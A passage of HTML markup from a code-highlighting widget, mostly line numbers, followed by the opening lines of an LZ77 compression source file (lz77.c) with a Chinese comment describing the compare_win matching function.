data-line=\"crayon-5b4d7bc4732a6740937600-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-85\">85</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-86\">86</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-87\">87</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-88\">88</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-89\">89</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-90\">90</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-91\">91</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-92\">92</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-93\">93</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-94\">94</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-95\">95</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-96\">96</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-97\">97</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-98\">98</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-99\">99</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-100\">100</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-101\">101</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-102\">102</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-103\">103</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-104\">104</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-105\">105</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-106\">106</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-107\">107</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-108\">108</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-109\">109</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-110\">110</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-111\">111</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-112\">112</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-113\">113</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-114\">114</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-115\">115</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-116\">116</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-117\">117</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-118\">118</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-119\">119</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-120\">120</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-121\">121</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-122\">122</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-123\">123</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-124\">124</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-125\">125</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-126\">126</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-127\">127</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-128\">128</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-129\">129</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-130\">130</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-131\">131</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-132\">132</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-133\">133</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-134\">134</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-135\">135</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-136\">136</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-137\">137</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-138\">138</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-139\">139</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-140\">140</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-141\">141</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-142\">142</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-143\">143</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-144\">144</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-145\">145</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-146\">146</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-147\">147</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-148\">148</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-149\">149</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-150\">150</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-151\">151</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-152\">152</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-153\">153</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-154\">154</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-155\">155</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-156\">156</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-157\">157</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-158\">158</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-159\">159</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-160\">160</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-161\">161</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-162\">162</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-163\">163</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-164\">164</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-165\">165</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-166\">166</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-167\">167</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-168\">168</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-169\">169</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-170\">170</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-171\">171</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-172\">172</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-173\">173</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-174\">174</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-175\">175</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-176\">176</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-177\">177</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-178\">178</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-179\">179</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-180\">180</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-181\">181</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-182\">182</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-183\">183</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-184\">184</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-185\">185</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-186\">186</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-187\">187</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-188\">188</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-189\">189</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-190\">190</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-191\">191</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-192\">192</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-193\">193</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-194\">194</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-195\">195</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-196\">196</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-197\">197</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-198\">198</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-199\">199</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-200\">200</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-201\">201</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-202\">202</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-203\">203</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-204\">204</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-205\">205</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-206\">206</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-207\">207</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-208\">208</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-209\">209</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-210\">210</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-211\">211</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-212\">212</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-213\">213</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-214\">214</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-215\">215</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-216\">216</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-217\">217</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-218\">218</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-219\">219</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-220\">220</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-221\">221</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-222\">222</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-223\">223</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-224\">224</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-225\">225</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-226\">226</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-227\">227</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-228\">228</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-229\">229</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-230\">230</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-231\">231</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-232\">232</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-233\">233</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-234\">234</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-235\">235</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-236\">236</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-237\">237</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-238\">238</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-239\">239</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-240\">240</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-241\">241</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-242\">242</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-243\">243</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-244\">244</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-245\">245</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-246\">246</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-247\">247</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-248\">248</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-249\">249</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-250\">250</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-251\">251</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-252\">252</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-253\">253</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-254\">254</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-255\">255</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-256\">256</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-257\">257</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-258\">258</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-259\">259</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-260\">260</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-261\">261</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-262\">262</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-263\">263</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-264\">264</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-265\">265</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-266\">266</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-267\">267</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-268\">268</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-269\">269</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-270\">270</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-271\">271</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-272\">272</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-273\">273</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-274\">274</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-275\">275</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-276\">276</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-277\">277</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-278\">278</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-279\">279</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-280\">280</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-281\">281</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-282\">282</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-283\">283</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-284\">284</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-285\">285</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-286\">286</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-287\">287</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-288\">288</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-289\">289</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-290\">290</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-291\">291</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-292\">292</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-293\">293</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-294\">294</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-295\">295</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-296\">296</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-297\">297</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-298\">298</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-299\">299</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-300\">300</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-301\">301</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-302\">302</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-303\">303</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-304\">304</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-305\">305</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-306\">306</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-307\">307</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-308\">308</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-309\">309</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-310\">310</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-311\">311</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-312\">312</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-313\">313</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-314\">314</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-315\">315</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-316\">316</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-317\">317</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-318\">318</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-319\">319</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-320\">320</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-321\">321</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-322\">322</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-323\">323</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-324\">324</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-325\">325</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-326\">326</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-327\">327</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-328\">328</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-329\">329</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7bc4732a6740937600-330\">330</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7bc4732a6740937600-331\">331</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-1\"><span class=\"crayon-c\">/*lz77.c*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-2\"><span class=\"crayon-p\">#include &lt;netinet/in.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-3\"><span class=\"crayon-p\">#include &lt;stdlib.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-4\"><span class=\"crayon-p\">#include &lt;string.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-6\"><span class=\"crayon-p\">#include \"bit.h\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-7\"><span class=\"crayon-p\">#include \"compress.h\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-8\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-9\"><span class=\"crayon-c\">/*compare_win 确定前向缓冲区中与滑动窗口中匹配的最长短语*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-10\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">compare_win</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" 